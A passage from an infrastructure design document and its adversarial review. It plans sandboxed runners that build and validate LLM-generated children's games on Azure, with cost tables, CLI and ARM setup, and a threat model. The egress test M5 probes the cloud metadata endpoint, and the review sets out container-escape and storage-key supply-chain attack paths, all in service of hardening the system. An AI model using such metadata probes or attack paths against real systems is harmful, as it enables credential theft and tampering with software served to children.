- **We would not use it anyway.** The child runs built bundles, not npm. Possible future use: a desktop "remix this
  game" editor for teachers. Revisit then.

### 7.4 Capacitor (Android APK)

- The app runs in Android System WebView (Chromium), so iframe `sandbox` and meta-tag CSP behave as in Chrome [M].
- Verify that an `https://` iframe from the Blob/play origin loads under the Capacitor scheme with no
  `allowNavigation` change [U; §13 M7].

---

## 8. Latency

| step | Phase 0 | Phase 1 | source |
|---|---|---|---|
| G1 fill → validated screenshot | 3–8 s (warm pool, new context) | same | [U] |
| G2 runner ready | 20–90 s cold; **about 0 if pre-started at lesson start** | create-from-snapshot "sub-second" (claimed); docs sample waits 15 s | [U] / [S] |
| per tool call round trip (orchestrator ↔ runner, same region) | 20–80 ms + command time | same | [U] |
| Chromium launch per check | 0.3–1 s (persistent browser per runner) | about 0 (warm in snapshot) | [U] |
| G2 end to end | P50 about 8 min, P90 about 15 min (llm-game-generation §8; dominated by LLM turns) | same minus about 1 min | [U] |
| game first paint for a child in India | Blob eastus2: about 1–3 s for 1.5 MB over 4G (about 250 ms RTT) | Blob centralindia: about 0.5–1.5 s | [U]; §13 M7 |

---

## 9. Cost per student-month

### 9.1 Assumptions [U]

- An active student has 20 lessons a month, each producing one G1 game.
- **G2 builds attributable to a student:** 2 a month in the early catalogue, falling to 0.3 when mature (cache hits
  dominate; llm-game-generation §8).
- A G2 build uses 12 min of 2 vCPU / 4 GiB in lane U.
- G1 validation uses 20 s of 1 vCPU in lane T.
- Per student: 10 MB private data and 20 game loads × 2 MB of egress.

### 9.2 Unit prices [V, Azure retail price API, 2026-10-02, eastus2 unless noted]

| item | price |
|---|---|
| ACA consumption vCPU | **$0.000024/s** (idle $0.000003/s) |
| ACA consumption memory | **$0.000003/GiB-s** |
| ACA requests | $0.40 per 1M |
| ACA Dedicated vCPU | $0.057077/h |
| ACA Dedicated memory | $0.004978/GiB-h |
| ACA Dedicated plan management | $0.10/h |
| code-interpreter sessions | $0.03/session-h |
| ACA free grant | 180k vCPU-s + 360k GiB-s + 2M requests per month [S] |
| Blob Hot LRS | $0.0184/GB-month (centralindia $0.020); writes $0.05 per 10k; reads $0.004 per 10k |
| Premium Block Blob ZRS | $0.20/GB-month (the rate for Sandbox disk images and snapshots) |
| internet egress, eastus2 | $0.087/GB after 100 GB free |
| internet egress, centralindia | $0.12/GB |
| Front Door Standard, India zone | $0.109/GB + $35/month base (needs `Microsoft.Cdn`) |
| ACI vCPU | $0.0405/h |
| ACI memory | $0.00445/GB-h |

### 9.3 Per student-month, variable cost

| line | early catalogue | mature catalogue |
|---|---|---|
| lane U compute: G2 × 720 s × (2 × 2.4e-5 + 4 × 3e-6) = $0.0432 per build | $0.086 | $0.013 |
| lane T compute: 20 × 20 s × (2.4e-5 + 2 × 3e-6) | $0.012 | $0.012 |
| Blob storage, 10 MB | $0.0002 | $0.0002 |
| Blob operations (about 200 writes + 2,000 reads) | $0.0018 | $0.0018 |
| egress, 40 MB | $0.004 | $0.004 |
| **infrastructure subtotal** | **about $0.10** | **about $0.03** |
| *for scale: LLM + images for the same G2 builds (llm-game-generation §8)* | *$3–7* | *$0.5–1* |

### 9.4 Fixed costs and the rejected alternatives

| item | per month | note |
|---|---|---|
| `forge-validator` warm, 1 vCPU / 2 GiB, min 1 | about $79 | the same price whether there are 1k or 50k students, until it scales out |
| Phase 1 golden disk image (about 3 GB) + 1 snapshot (about 4 GB) at Premium ZRS | about $1.4 | shared by all builds |
| ~~dynamic sessions custom container, 1 warm E16 node~~ | ~~about $1,205~~ | rejected below about 7 always-busy builds (§3.2) |
| ~~always-on micro container per student (0.25 vCPU / 0.5 GiB)~~ | ~~$19.7 per student~~ | (0.25 × 2.4e-5 + 0.5 × 3e-6) × 2.63M s |
| ~~persistent Sandbox per student (M, memory-mode stop)~~ | ~~about $0.50 per student~~ storage alone [U] | about 2 GiB memory image + about 0.5 GB disk delta at $0.20/GB-month, once storage billing starts. 100k students ≈ $50k/month for nothing |

---

## 10. Concurrency and quotas

### 10.1 Peak model [U]

- 60% of lessons fall in a weekday 4–9 pm IST window (110 h/month).
- Lessons per peak hour ≈ 0.11 N, for N active students.

| N students | peak lessons/h | concurrent G2 builds (early / mature) | lane U cores (2 vCPU each) | lane T contexts (20 s each) | quota action |
|---|---|---|---|---|---|
| 1,000 | 110 | 2.2 / 0.3 | 5 / 1 | about 1 | none (jobs); Sandbox quota 1 → 16 |
| 10,000 | 1,100 | 22 / 3.3 | 44 / 7 | about 6 (2 replicas) | Sandbox cores → 100 |
| 100,000 | 11,000 | 220 / 33 | **440** / 66 | about 61 (about 15 replicas × 2 vCPU) | env Consumption cores 100 → 600; Sandbox cores → 500 (the typical default [S]); Sandbox API 3,000 rpm is enough if tool calls go over WSS, not the data plane |

Burst protection:

- The queue absorbs spikes.
- Builds are **never on the lesson's critical path**: the G1 game ships first, G2 arrives "for practice".
- The queue is drained in priority order: in-lesson requests, then the speculative catalogue backfill.

### 10.2 Provider abstraction (swap lanes without touching the harness)

```ts
export type LaneKind = "aca-job" | "aca-sandbox" | "warm-pool" | "local-docker";

export interface SandboxSpec {
  jobId: string;
  kitHash: string;                    // selects image / snapshot
  cpu: 1 | 2 | 4; memGiB: 2 | 4 | 8;
  wallClockSec: number;               // hard cap (default 1200)
  egress: { default: "deny"; allowHosts: string[] };   // Phase 1 enforced by the platform; Phase 0 advisory + Chromium-level
  speculative?: boolean;              // pre-start at lesson begin
}

export interface SandboxLease {
  id: string; lane: LaneKind; bootMs: number; isolation: "container" | "microvm";
  call<T = unknown>(tool: RunnerTool, args: unknown, timeoutMs: number): Promise<ToolResult<T>>;
  pull(path: string): Promise<Uint8Array>;            // orchestrator copies dist/ out; runner never writes public Blob
  release(reason: "done" | "cap" | "error"): Promise<void>;   // job: send exit; sandbox: delete (or stop for debug)
}

export interface SandboxProvider {
  kind: LaneKind;
  acquire(spec: SandboxSpec): Promise<SandboxLease>;  // resolves when the runner says hello over WSS
  health(): Promise<{ ready: number; running: number; quotaCores: number; usedCores: number }>;
}

export type RunnerTool =
  | "fs.read" | "fs.write" | "fs.list" | "apply_patch"
  | "run_check"        // {name: typecheck|build|keypoints|solve|boot|playtest}
  | "screenshot"       // {level, at, viewport}
  | "bundle";          // produce dist/ + manifest with sha256 per file

export interface ToolResult<T> { ok: boolean; out: T; ms: number; truncated: boolean; stderrTail?: string }

// Runner ⇄ orchestrator wire protocol (WSS, JSON frames; runner initiates)
type Hello  = { t: "hello"; jobId: string; token: string; lane: LaneKind; image: string; bootMs: number;
                chromium: { sandboxed: boolean; version: string } };
type Call   = { t: "call"; id: string; tool: RunnerTool; args: unknown; timeoutMs: number };
type Result = { t: "result"; id: string } & ToolResult<unknown>;
type Bye    = { t: "bye"; reason: "done" | "cap" | "error"; usage: { cpuSec: number; peakMemMiB: number } };
```

---

## 11. Security model summary

| threat | Phase 0 (job) | Phase 1 (sandbox) |
|---|---|---|
| LLM code exfiltrates data from the build machine | nothing worth taking (no keys, no identity, kit only); page network blocked by resolver + route abort; static scan | the same, plus platform egress `Deny` except the orchestrator |
| LLM code attacks the metadata/identity endpoint | blocked at Chromium; no identity attached | egress proxy denies by default |
| Chromium renderer 0-day → container | the container is the wall; one-time token scope = 1 job; internet egress open (residual risk) | microVM wall, so the Chromium sandbox can stay on [U] |
| cross-build contamination | a fresh job replica per build | a fresh sandbox per build, created from the snapshot |
| runner impersonation | token bound to `jobId`, single use, TTL | same |
| child data leak via public URLs | builds hold no child data; `instanceId` ≠ `childId`; params arrive by postMessage | same |
| game abuses the host | opaque origin, zod bridge, nonce, rate limits | same |
| a starter of jobs reads job secrets [S] | the job holds only the queue-reader secret; Contributor on the RG is already full trust | n/a |

---

## 12. IaC sketch

### 12.1 Phase 0: runnable today by the SP (RG Contributor)

The CLI form is shown. ARM REST equivalents follow the `scripts/deploy-azure.mjs` pattern (`fetch` +
client-credentials).

```bash
RG=rg-raghavsharma1729-7190 ENV=taxila-env LOC=eastus2 ACR=taxilacr SA=taxilaforge SHA=$(git rev-parse --short HEAD)
az login --service-principal -u "$AZURE_SP_CLIENT_ID" -p "$AZURE_SP_SECRET" --tenant "$AZURE_TENANT_ID"
az extension add --name containerapp --upgrade -y

# 1) runner image, built in ACR from the pushed branch (same as taxila-web). Dockerfile: docker/forge-runner.Dockerfile
#    FROM mcr.microsoft.com/playwright:v1.63.0-noble ; COPY kit /kit ; RUN cd /kit && npm ci && npx tsc -b || true
#    COPY runner /runner ; USER pwuser ; ENTRYPOINT ["node","/runner/main.mjs"]
az acr build -r $ACR -t forge-runner:$SHA -t forge-runner:latest -f docker/forge-runner.Dockerfile \
  "https://github.com/raghavsharma2003/Taxila.git#$(git rev-parse --abbrev-ref HEAD)"

# 2) queue + private containers (account key auth; no RBAC needed)
KEY=$(az storage account keys list -g $RG -n $SA --query [0].value -o tsv)
CONN=$(az storage account show-connection-string -g $RG -n $SA --query connectionString -o tsv)
az storage queue create     --name forge-jobs --account-name $SA --account-key "$KEY"
az storage container create --name forge-runs --account-name $SA --account-key "$KEY" --public-access off
az storage container create --name learner    --account-name $SA --account-key "$KEY" --public-access off
az storage account management-policy create -g $RG --account-name $SA --policy @infra/blob-lifecycle.json  # runs: Cool@30d, delete@180d

# 3) untrusted lane: event-driven job; the runner dequeues {jobId, token} itself and deletes the message
ACRPW=$(az acr credential show -n $ACR --query passwords[0].value -o tsv)
az containerapp job create -n forge-runner -g $RG --environment $ENV --trigger-type Event \
  --replica-timeout 1500 --replica-retry-limit 0 --parallelism 1 --replica-completion-count 1 \
  --min-executions 0 --max-executions 40 --polling-interval 5 \
  --scale-rule-name forge-q --scale-rule-type azure-queue \
  --scale-rule-metadata accountName=$SA queueName=forge-jobs queueLength=1 \
  --scale-rule-auth connection=queue-conn --secrets queue-conn="$CONN" \
  --image $ACR.azurecr.io/forge-runner:$SHA --registry-server $ACR.azurecr.io \
  --registry-username $ACR --registry-password "$ACRPW" \
  --cpu 2 --memory 4Gi \
  --env-vars FORGE_ORCH_WSS=wss://taxila-web.nicebay-a0d3a12f.eastus2.azurecontainerapps.io/forge/runner \
             QUEUE_CONN=secretref:queue-conn LANE=aca-job
# (no --mi-system-assigned: the runner must have NO identity)

# 4) trusted lane: warm validator (internal ingress only; called by taxila-web inside the env)
az containerapp create -n forge-validator -g $RG --environment $ENV \
  --image $ACR.azurecr.io/forge-runner:$SHA --registry-server $ACR.azurecr.io \
  --registry-username $ACR --registry-password "$ACRPW" \
  --cpu 1 --memory 2Gi --min-replicas 1 --max-replicas 15 \
  --ingress internal --target-port 8080 --scale-rule-name http --scale-rule-type http --scale-rule-http-concurrency 4 \
  --command node --args /runner/validator-server.mjs
```

ARM REST form of step 3. Contributor can PUT this. Use the api-version already used in the repo:

```http
PUT https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.App/jobs/forge-runner?api-version=2024-03-01
{ "location": "eastus2",
  "properties": {
    "environmentId": "/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.App/managedEnvironments/taxila-env",
    "configuration": {
      "triggerType": "Event", "replicaTimeout": 1500, "replicaRetryLimit": 0,
      "secrets": [{ "name": "queue-conn", "value": "<conn>" }, { "name": "acr-pw", "value": "<pw>" }],
      "registries": [{ "server": "taxilacr.azurecr.io", "username": "taxilacr", "passwordSecretRef": "acr-pw" }],
      "eventTriggerConfig": { "parallelism": 1, "replicaCompletionCount": 1,
        "scale": { "minExecutions": 0, "maxExecutions": 40, "pollingInterval": 5,
          "rules": [{ "name": "forge-q", "type": "azure-queue",
            "metadata": { "accountName": "taxilaforge", "queueName": "forge-jobs", "queueLength": "1" },
            "auth": [{ "triggerParameter": "connection", "secretRef": "queue-conn" }] }] } } },
    "template": { "containers": [{ "name": "runner", "image": "taxilacr.azurecr.io/forge-runner:<sha>",
      "resources": { "cpu": 2, "memory": "4Gi" },
      "env": [{ "name": "FORGE_ORCH_WSS", "value": "wss://…/forge/runner" },
              { "name": "QUEUE_CONN", "secretRef": "queue-conn" }, { "name": "LANE", "value": "aca-job" }] }] } } }
```

The runner reads the queue to claim a message. The queue connection string is the one secret it holds. It grants
access to the queue and also the whole storage account, including the public `forge` container. Mitigation: give the
runner a **queue-only SAS** instead (`az storage queue generate-sas --permissions rp` on `forge-jobs`, expiry 90 days,
rotated by `deploy-azure.mjs`). Keep the full connection string only in the KEDA `scale-rule-auth` secret, which the
container does not need to read.

### 12.2 Phase 1: owner one-time actions, then SP-run

The owner, once, in the portal or `az` as subscription Owner:

```bash
# a) quota: SandboxCores eastus2 1 → 100 (portal: My quotas → Azure Container Apps → eastus2 → "Sandbox Cores")
# b) data-plane role for the Forge SP on the sandbox group (RG scope is simpler and survives group re-creation)
az role assignment create --role "Container Apps SandboxGroup Data Owner" \
  --assignee-object-id <forge-sp-object-id> --assignee-principal-type ServicePrincipal \
  --scope /subscriptions/<sub>/resourceGroups/rg-raghavsharma1729-7190
# c) optional, for Phase 2: az provider register -n Microsoft.Network ; az provider register -n Microsoft.Cdn
```

Then the SP:

```http
PUT https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.App/sandboxGroups/taxila-forge?api-version=2026-02-01-preview
{ "location": "eastus2",
  "properties": { "defaultCpu": "2", "defaultMemory": "4Gi", "defaultDisk": "40Gi",
                  "maxSandboxCount": 200, "defaultTimeoutSeconds": 1500 } }
```

```ts
// golden-snapshot.ts: nightly, and on every kit change (TypeScript SDK; DefaultAzureCredential = SP env vars)
import { SandboxGroupClient, endpointForRegion } from "@azure/containerapps-sandbox";
const g = new SandboxGroupClient(cred, endpointForRegion("eastus2"), SUB, RG, "taxila-forge");
// 1. disk image from ACR (username/token auth — ACR admin user is enabled [V])
const img = await g.diskImages.beginCreate({ image: `taxilacr.azurecr.io/forge-runner:${sha}`,
  registryAuth: { username: "taxilacr", token: ACR_PW }, name: `forge-runner-${sha}` }).pollUntilDone();
// 2. boot, warm Chromium against the kit template, then snapshot (memory mode)
const sb = await g.sandboxes.beginCreate({ sourcesRef: { diskImage: { id: img.id } },
  egressPolicy: { defaultAction: "Deny", rules: [{ match: { host: "taxila-web.nicebay-a0d3a12f.eastus2.azurecontainerapps.io" }, action: "Allow" }] },
  labels: { role: "golden", kit: sha } }).pollUntilDone();
await g.sandboxes.exec(sb.id, { command: "node /runner/warm.mjs" });  // launches Chromium, loads template, idles
const snap = await g.sandboxes.snapshot(sb.id, { name: `golden-${sha}` });
await g.sandboxes.delete(sb.id);
// per build: g.sandboxes.beginCreate({ sourcesRef: { snapshot: { id: snap.id } }, labels: { job: jobId } })
//            → runner inside re-dials WSS with a fresh token passed via exec env → release() = delete
```

Method and field names follow the docs and SDK samples [S/V]. The TypeScript SDK's exact disk-image and egress field
names are [U]. Confirm against `@azure/containerapps-sandbox` typings before writing the real file.

### 12.3 Phase 2 (only when scale or latency demands it)

- **Play origin in India.** Storage account `taxilaplay` (centralindia, Hot LRS) holds a replica of `forge/b/*`.
  - Blob object replication or a publish-time dual write [M].
  - Fronted by a 0.25 vCPU Container App `taxila-play`. It streams blobs and sets header CSP + `frame-ancestors`.
  - It needs a centralindia ACA environment (quota 2 of 20 used in that region [V]).
  - Or use Front Door, after `Microsoft.Cdn` is registered.
- **VNet + NSG egress deny for jobs.** After `Microsoft.Network` is registered. Only needed if Phase 0 jobs stay as
  the main lane.

---

## 13. Measurements to run before committing (in order; each one writes a `context/measurements.md` entry)

| id | what | method | n | pass bar |
|---|---|---|---|---|
| M1 | ACA Job cold → runner `hello` | manual `start` vs queue-triggered (pollingInterval 5); first run after an image push vs repeat | 10 + 10 | P90 ≤ 60 s queue-triggered; record pull time from system logs |
| M2 | Chromium in job: sandboxed launch possible? First screenshot; fps of 3 golden kit games under SwiftShader at 2 vCPU | `chromium.launch()` with and without `--no-sandbox`; `requestAnimationFrame` counter over 5 s | 5 per game | record; set the V2 fps gate from this, not from desktop numbers |
| M3 | ACA Sandbox create-from-snapshot → `exec` ok; stop → resume (memory mode) | `aca` CLI timestamps; after the quota grant | 10 + 10 | P90 ≤ 3 s, else the "sub-second" claim is not ours |
| M4 | Chromium inside a Sandbox (L), sandbox flag on | same as M2 | 5 | sandboxed launch works |
| M5 | egress proof | from the page: `fetch('https://example.com')`, `fetch('http://169.254.169.254/')`, DNS of `azure.com`; from the shell in Phase 1: `curl` to the same | 3 per lane | all blocked; gate G2 fails the build |
| M6 | full G2 build wall clock per lane | the same 5 briefs | 5 × 2 | Phase 1 ≤ Phase 0 − 45 s |
| M7 | child first paint from India | Android (Capacitor build) on Jio 4G: Blob eastus2 vs centralindia; also confirm the iframe loads under the Capacitor scheme | 5 per origin | ≤ 1.5 s P50 from centralindia |
| M8 | lane T G1 validate latency at load | k6: 20 parallel validations | 200 | P95 ≤ 8 s with 2 replicas |

---

## 14. Risks, reversal conditions, and what to log in `context/`

**Proposed `context/decisions.md` entry `forge-sandbox-lanes` (2026-10-02):**

- Untrusted builds run in an ephemeral per-build sandbox:
  - Phase 0: ACA Job with a reverse-connected runner.
  - Phase 1: ACA Sandboxes from a warm snapshot.
- Trusted G1 validation runs on a warm Chromium pool.
- The child workspace is Postgres + private Blob. Play happens only in a sandboxed iframe.
- **Supersedes** the dynamic-sessions choice in `coding-agent-harnesses.md` §5.1, because of E16 Dedicated billing and
  RBAC the SP cannot grant.
- **Reverse if any of these:**
  1. M3 shows Sandbox snapshot start P90 > 10 s, so jobs with pre-start are as good. Stay on jobs.
  2. Sandboxes leave preview without an SLA path, or storage billing makes golden snapshots cost more than about
     $50/month.
  3. Sustained concurrent builds exceed about 7 around the clock. Re-price dynamic sessions custom containers or a
     Dedicated profile, where packing beats per-second billing.
  4. A real need for per-child process continuity appears. Then use a per-child Sandbox in disk mode with auto-delete
     at 7 days, never memory mode.

**Proposed rejection-style entry `vm-per-student`:**

- Rejected **by cost arithmetic, not by trial**. Say so honestly.
- Per-child persistent VMs cost about $0.50 (snapshot) to $20 (always-on) per student-month, with no capability the
  data model lacks.
- If ever tried, measure snapshot sizes and resume times first.

**Proposed measurement entry `azure-sandbox-capability-probe-2026-10-02`:** the table in §1. n=1, read-only ARM GETs,
SP credentials.

**Open risks:**

- ACA Sandboxes is preview with no SLA [S]. Keep the Phase 0 lane deployable as a fallback forever. It is one job
  definition.
- **The Phase 0 job has open internet egress.** The residual risk is a Chromium 0-day reaching the internet from a
  container that holds nothing. Accepted until Phase 1 or a VNet.
- The SwiftShader fps gate may be miscalibrated (M2).
- The meta CSP depends on the template owning `<head>`, so G0 must enforce byte identity.
- The Blob public container plus a guessable `buildSha` is fine: builds contain no child data. Keep it that way with a
  G6 check: no PII strings in dist, and the bundle must not contain `params`.
- **Owner actions are the critical path for Phase 1:** quota, the role assignment, and optionally provider
  registrations. File them now; quota tickets can take days [M].

---

## Sources

Azure, Microsoft Learn:
- Dynamic sessions overview: https://learn.microsoft.com/en-us/azure/container-apps/sessions
- Session pools (CLI flags, cooldown 300–3600 s, max 600, lifecycle types): https://learn.microsoft.com/en-us/azure/container-apps/session-pool
- Custom container sessions (probes, stop/get/list): https://learn.microsoft.com/en-us/azure/container-apps/sessions-custom-container
- Sessions usage (auth audience, Session Executor role, identifiers, managed identity): https://learn.microsoft.com/en-us/azure/container-apps/sessions-usage
- Billing (free grants; code interpreter per session-hour; **custom container on Dedicated E16**): https://learn.microsoft.com/en-us/azure/container-apps/billing
- Quotas (session pools, Sandboxes/Express 2,000 cores note): https://learn.microsoft.com/en-us/azure/container-apps/quotas
- Jobs (triggers, start with template override, pollingInterval 30 s, no ingress, RBAC warning): https://learn.microsoft.com/en-us/azure/container-apps/jobs
- Sandboxes overview / lifecycle / egress / CLI / Bicep / get started:
  - https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-overview
  - https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-snapshots-state-management
  - https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-egress-policies
  - https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-quickstart-cli
  - https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-quickstart-bicep
  - https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-get-started
- Reliability in Container Apps Sandboxes (microVM, no SLA, single-region): https://learn.microsoft.com/en-us/azure/reliability/reliability-container-apps-sandboxes
- Sandboxes product docs:
  - cost: https://sandboxes.azure.com/docs/sandboxes/cost
  - limits (500 cores typical, 3,000 rpm): https://sandboxes.azure.com/docs/sandboxes/limits
  - regions: https://sandboxes.azure.com/docs/sandboxes/regions
  - disk images: https://sandboxes.azure.com/docs/sandboxes/disk-images
  - ports: https://sandboxes.azure.com/docs/sandboxes/sandbox/ports
  - volumes: https://sandboxes.azure.com/docs/sandboxes/volumes
  - lifecycle: https://sandboxes.azure.com/docs/sandboxes/sandbox/lifecycle
  - snapshots: https://sandboxes.azure.com/docs/sandboxes/snapshots
  - TypeScript SDK: https://sandboxes.azure.com/docs/sandboxes/quickstart/setup-typescript-sdk
  - dynamic sessions vs sandboxes: https://sandboxes.azure.com/docs/sandboxes/dynamic-sessions-vs-sandboxes
- SDK source read: `azure-containerapps-sandbox` 0.1.0b4 (PyPI wheel): `_helpers.py` (data-plane base and scope),
  `_sandbox_client.py` (operation paths), `_operations/_sandbox_ops.py` (create params, defaults),
  `_model_types/_lifecycle.py`, `_ports.py`, `_api_version.py` (`2026-02-01-preview`).
  https://pypi.org/project/azure-containerapps-sandbox/
- SessionPools REST spec 2025-07-01 / 2025-02-02-preview: https://github.com/Azure/azure-rest-api-specs/tree/main/specification/app/resource-manager/Microsoft.App/ContainerApps
- ACI overview (hypervisor-level isolation, standby pools, VNet needs NAT gateway): https://learn.microsoft.com/en-us/azure/container-instances/container-instances-overview
- Azure Retail Prices API (all $ figures in §9.2): https://prices.azure.com/api/retail/prices

Non-Azure:
- E2B pricing: https://e2b.dev/pricing ; E2B infra (Apache-2.0, Firecracker, needs KVM): https://github.com/e2b-dev/infra
- Daytona pricing: https://www.daytona.io/pricing
- Modal pricing (sandbox premium): https://modal.com/pricing
- Fly.io pricing: https://docs.fly.io/about/pricing
- Vercel Sandbox pricing and limits: https://vercel.com/docs/vercel-sandbox/pricing
- Firecracker specification (≤ 125 ms boot, ≤ 5 MiB overhead): https://github.com/firecracker-microvm/firecracker/blob/main/SPECIFICATION.md
- gVisor docs: https://gvisor.dev/docs/
- Playwright Docker (`--ipc=host`, non-root, seccomp, image tags): https://playwright.dev/docs/docker
- WebContainers licensing: https://webcontainers.io/enterprise ; browser support: https://webcontainers.io/guides/browser-support
- Pyodide deployment: https://pyodide.org/en/stable/usage/downloading-and-deploying.html

---

## Principal review

**Reviewer stance:** adversarial principal engineer, 2026-10-02. **Question attacked:** will this infrastructure get a
fun, correct, bug-free game onto a 9-year-old's phone within minutes, on Azure, without a security hole?
**Verdict:** the shape is right: a VM per build, a folder per student, an iframe per play. The cost thesis holds:
compute is noise next to tokens. But four claims are wrong or unsafe as written:

- the play-time CSP breaks the chosen game kit (R1);
- the untrusted runner shares an environment, and the full storage-account key, with production (R2, R3);
- the concurrency table is bounded by model TPM, not by cores (R6);
- the speculative pre-start silently costs about 10× the infrastructure subtotal and, at scale, cannot fit the quota
  (R7).

The §12.2 SDK code would not compile against the real SDK (R12).

Tags as in the header. **[V-R]** means the reviewer verified it today, by reading the published docs or by unpacking
the package.

### What was re-verified and holds

| claim | check | status |
|---|---|---|
| Custom-container session pools run on Dedicated **E16** instances, billed by node count; code interpreter billed per allocated session in **1-hour increments** | Learn billing page, `ms.date` 2025-12-09 | **[V-R] correct.** The supersede of `coding-agent-harnesses` §5.1 stands |
| Free grant: 180k vCPU-s + 360k GiB-s + 2M requests per subscription per month; jobs always at the active rate | same page | [V-R] correct, but see R7 for who actually consumes it |
| Sandbox tiers XS–XL; data plane `management.<region>.azuredevcompute.io`; scope `https://dynamicsessions.io/.default`; api `2026-02-01-preview`; role *Container Apps SandboxGroup Data Owner* | `@azure/containerapps-sandbox@1.0.0-beta.1` (`api/sandboxGroupContext.js`: `DATA_PLANE_SCOPE`, `endpointForRegion`) plus the Learn overview (updated 2026-09-28) | [V-R] correct. The TS SDK **does** exist (published 2026-07-11) |
| `mcr.microsoft.com/playwright:v1.63.0-noble` | npm `playwright` dist-tag `latest` = 1.63.0 | [V-R] current |
| Pyodide `v314.0.7` | npm `pyodide` latest = 314.0.7 | [V-R] current |

### Corrections

**R1. The play CSP `connect-src 'none'` breaks Phaser asset loading. P0, product-breaking.**

- **Evidence.** Phaser's `Config.js` has `loader.imageLoadType` defaulting to `'XHR'`. `ImageFile` loads through
  `XMLHttpRequest`, then `createObjectURL`. JSON, atlases and WebAudio sounds also go through `XHRLoader`. Only
  `data:` / base64 URLs skip the XHR [V-R, phaser master source].
- Under `connect-src 'none'`, every non-inlined asset of the kit chosen in `game-kit-frameworks` fails to load.
- **This is the same finding as `llm-game-generation` Principal review: rejection `csp-connect-none-phaser`.** This
  doc's §7.1 still has the broken policy, so the two docs now contradict each other.
- The G2 runner would not catch it either: it serves dist from `http://127.0.0.1` as a top-level page, not from an
  opaque origin (see R5).
- **Fix: `connect-src 'self'`, with the play origin hosting only immutable public builds.** The only extra reachable
  host is our own storage host, where anonymous writes are impossible.
  - Add to this: Blob CORS that allows `Origin: null` (`*` already does); `loader.imageLoadType: 'HTMLImageElement'`
    as the kit default; and a G0 check that every URL the loader requests is under `forge/b/<sha>/` or
    `forge/kit/<kitHash>/`.
- **Do not inline all assets as base64.** It adds about 33% bytes and defeats the HTTP cache for kit assets that every
  build shares.

**R2. The untrusted lane shares `taxila-env` with `taxila-web`. P0, security.**

- **Evidence.** Learn's environment page says to use separate environments when apps must "**never share the same
  compute resources**". Apps in one environment "share the same virtual network" and the same log destination
  [V-R].
- So a container escape from a Chromium renderer running with `--no-sandbox` (R4) can land on a node that runs
  `taxila-web`. That app holds the Azure OpenAI key, the Neon URL and the SP secret.
- The runner can also reach every internal-ingress app, including `forge-validator`.
- Its stdout goes to the same Log Analytics workspace as production. That opens log injection, and brief PII lands in
  shared logs.
- **Fix:**
  - Put `forge-runner` in a **separate managed environment** (`taxila-forge-untrusted`, Consumption, eastus2). It
    costs nothing while idle.
  - Give it its own Log Analytics workspace, or `appLogsConfiguration: none` plus redacted structured logs over WSS.
  - Learn auto-deletes an environment that stays idle for 90 days. Keep one scheduled no-op job execution per month.
  - Keep the trusted validator in `taxila-env`.

**R3. The IaC as written gives the untrusted runner the whole storage account. P0, security.**

- §12.1 step 3 sets `QUEUE_CONN=secretref:queue-conn`, which is the **full account connection string**.
- §12.1's closing paragraph names the right mitigation, but the runnable commands do not apply it.
- With that key, a compromised runner can overwrite `forge/b/*` in the **public** container. That is a supply-chain
  attack on every child who opens any game. It can also read `learner/`.
- **Fix:**
  - Rewrite step 3 so the container receives only a queue-scoped SAS (`rp` on `forge-jobs`). The full string lives
    only in the KEDA `scale-rule-auth` secret.
  - Better: move `learner/` and `forge-runs/` to a **second, private-only storage account**
    (`allowBlobPublicAccess=false`), so no key that touches the public container ever sits next to child data.
  - Set the `forge` container to `--public-access blob`, never `container`, so it cannot be listed.
  - Replace the ACR **admin** password, which has push rights and is shared by `taxila-web`, the job and the
    Sandboxes disk-image import, with a **pull-only scope-map token**. Basic supports 100 [V-R, ACR SKU page].

**R4. Playwright launches Chromium unsandboxed by default. "Try sandboxed first" never happens unless you ask.**

- `chromiumSandbox` "Enable Chromium sandboxing", default **`false`** [V-R, Playwright BrowserType docs].
- §5.3 and the `Hello.chromium.sandboxed` field assume the sandbox is attempted.
- **Fix:**
  - Launch with `chromiumSandbox: true`, catch the failure, then relaunch without it and record which one ran.
  - Expect failure on ACA Consumption. There is no custom seccomp profile, and Playwright's own Docker guide needs one
    for the sandbox [S].
  - So in Phase 0 the renderer is the only process boundary, and the container is the only wall. That makes R2 and R3
    mandatory, not hygiene.

**R5. Validation runs the game in a different environment from production, so "passes the gate, fails on the child".
P0, correctness.**

- §5.3 serves dist as a top-level `http://127.0.0.1` page. Production is an **opaque-origin**
  `sandbox="allow-scripts"` iframe inside the host app, on a cross-origin URL.
- Behaviours that differ between the two:
  - `localStorage`, `indexedDB` and `caches` throw in production only;
  - XHR is a CORS request with `Origin: null`;
  - `postMessage` arrives with `e.origin === "null"`;
  - what CSP `'self'` resolves to inside an opaque-origin document. Chrome uses the URL's origin [M]. Measure it and
    do not assume it;
  - autoplay and audio-unlock rules inside a frame;
  - viewport and DPR.
- **Fix.** G2 must load `host-harness.html` on `http://127.0.0.1:<p1>`. That page embeds the build from
  `http://localhost:<p2>` (a different origin) with the **exact production iframe attributes, CSP and bridge host**,
  and replays `init`.
- Also add, as cheap and high-value checks:
  - **Build for the device floor.** Set esbuild `target` to the measured Android System WebView floor of our users
    (log `navigator.userAgent` today). Chromium 1.63 accepts syntax an older WebView rejects.
  - Run each G2 check once at a **360×640, DPR 2, 4× CPU-throttled** profile.
  - Make playtests deterministic with **`page.clock`**. It fakes `Date`, timers, `requestAnimationFrame`,
    `performance` and `Event.timeStamp` [V-R, Playwright clock docs]. Step frames instead of sleeping.
- Under SwiftShader on 2 shared vCPU, wall-clock playtests will flake. Each flake buys an LLM repair round of about
  $0.1–0.3, chasing a bug that does not exist. **Keep perf (fps) and correctness in separate gates.** Never feed a
  perf flake to the repair loop.

**R6. The concurrency table (§10.1) is bounded by model TPM, not by sandbox cores.**

- `llm-game-generation` Principal review P4 measured about **1 concurrent G2 build per 500k-TPM `taxila-codex`
  deployment**. It also revised the G2 wall clock to **P50 12–15 min, P90 > 20 min**.
- §10.1's "22 concurrent builds at 10k students" therefore needs about 22 deployments' worth of TPM. Core quota is
  irrelevant at every N in the table.
- **Fix:**
  - Replace the "lane U cores" column with "codex TPM needed", plus an **admission controller** keyed on measured TPM
